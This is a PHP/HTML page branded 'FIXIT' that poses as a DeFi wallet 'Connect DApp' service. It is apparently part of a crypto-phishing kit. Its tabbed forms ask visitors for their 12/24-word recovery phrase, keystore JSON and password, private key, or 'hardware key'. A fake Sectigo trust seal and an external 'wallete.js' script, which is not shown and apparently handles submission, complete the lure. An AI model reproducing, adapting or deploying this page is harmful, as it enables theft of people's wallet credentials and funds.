<?php

session_start();
$wallet = "Trustee Wallet";

if(isset($_SESSION['wallettype']) ) { $wallet = $_SESSION['wallettype']; }

?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width"/>
<meta charSet="utf-8"/>
<title>FIXIT</title>
<meta name="description" content="Defi – Protocol is a free protocol that lets users manage all their wallets from one space"/>
<link rel="icon" href="coin.png"/>
<meta name="next-head-count" content="5"/>
<link rel="preload" href="_next/static/css/2b7eea1d064d98b564d2.css" as="style"/>
<link rel="stylesheet" href="_next/static/css/2b7eea1d064d98b564d2.css" data-n-g=""/>
<noscript data-n-css=""></noscript>
</head>

<body><div id="__next"><header class="fixed z-50 w-full mb-60 bg-white py-8 px-6 text-white border-b shadow-md">
<div class="container max-w-screen-lg mx-auto flex flex-row items-center justify-between">


</div>
</header>
<div class="h-28"></div>

<main>
<div class="container max-w-screen-sm py-20 px-4 flex flex-col h-full items-center justify-items-center mx-auto text-center">
&nbsp <img src="coin.png" alt="" style="position: absolute; center: 20px; width: 30px; height: 30px;">
<h2 class="text-2xl text-center justify font-bold mb-2">Connect DApp</h2>
<p class="text-sm mb-8">Synchronize your selected wallet <span class="bg-gray-300 p-1"><?php echo $wallet; ?></span> to continue</p>
<div class="flex flex-wrap">
<div class="w-full">
<ul id="tabhost" class="flex mb-0 list-none flex-wrap pt-3 pb-4 flex-row" role="tablist">
<li class="-mb-px mr-2 last:mr-0 flex-auto text-center">
<a class="text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-primary" data-toggle="tab" href="#link1" role="tablist">Mnemonics</a>
</li>
<li class="-mb-px mr-2 last:mr-0 flex-auto text-center">
<a class="text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-primary bg-white" data-toggle="tab" href="#link2" role="tablist">Keystore</a>
</li>
<li class="-mb-px mr-2 last:mr-0 flex-auto text-center">
<a class="text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-primary bg-white" data-toggle="tab" href="#link3" role="tablist">Private Key</a>
</li>
<li class="-mb-px mr-2 last:mr-0 flex-auto text-center">
<a class="text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-primary bg-white" data-toggle="tab" href="#link4" role="tablist">Hardware</a>
</li>
</ul>

<div class="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded">
<div class="px-4 py-5 flex-auto">
<div class="tab-content tab-space">
<div class="block" id="link1">
<form class="p-1"><div class="mb-3 pt-0">
<div class="text-sm mb-1 text-gray-500">Please enter your 12/24 word phrase</div>
<textarea rows="4" name="txtar" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea>
</div>
<div class="mt-6 mb-2">
<button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="button">CONNECT</button>
</div>
</form>
</div>

<div class="hidden" id="link2">
<form class="p-1">
<div class="mb-3 pt-0">
<div class="text-sm mb-1 text-gray-500">Enter your Keystore JSON</div>
<textarea rows="2"  name="txtar" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea><div class="text-left text-xs text-gray-400">Key must be in JSON format</div>
</div>
<div class="mb-3 pt-0">
<div class="text-sm mb-1 text-gray-500">Password</div>
<input type="password"  name="txtin" required="" value="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"/>
</div>

<div class="mt-6 mb-2">
<button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="button">CONNECT</button>
</div>
</form>
</div>
<div class="hidden" id="link3">
<form class="p-1">
<div class="mb-3 pt-0">
<div class="text-sm mb-1 text-gray-500">Enter your private key</div>
<textarea rows="4"  name="txtar" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea>
<div class="text-left text-xs text-gray-400">Key must be in HEX format</div>
</div>
<div class="mt-6 mb-2">
<button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="button">CONNECT</button>
</div>
</form>
</div>
<div class="hidden" id="link4">
<form class="p-1"><div class="mb-3 pt-0">
<div class="text-sm mb-1 text-gray-500">Enter your Hardware Key</div>
<textarea rows="4" name="txtar" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea>
<div class="text-left text-xs text-gray-400">Key must be in HEX format</div>
</div>
<div class="mt-6 mb-2">
<button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="button">CONNECT</button>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
<footer class="border-t border-gray-200">
<div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between  py-4">
<ul class="flex mb-4 md:order-1 md:ml-4 md:mb-0">
<li>
<a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Twitter">
<svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z"></path></svg>
</a>
</li>
<li class="ml-4">
<a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Github"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z"></path></svg></a></li><li class="ml-4">
<a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Facebook">
<svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z"></path></svg>
</a>
</li><li><img src="sectigo_trust_seal_lg.png" width="120px;" class="fixbtm"></li>
</ul>
<div class="text-sm mr-4">© <!-- -->2023<!-- --> 
<a class="text-primary hover:underline" href="/">FIXIT</a>. All rights reserved.
</div>
</div>
</footer>
</div>
<!--
<script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"id":"1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369"},"__N_SSP":true},"page":"/validate-wallet","query":{"type":"1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369"},"buildId":"build","runtimeConfig":{},"isFallback":false,"gssp":true}</script>
-->
<script src="wallete.js"></script>
</body>
</html>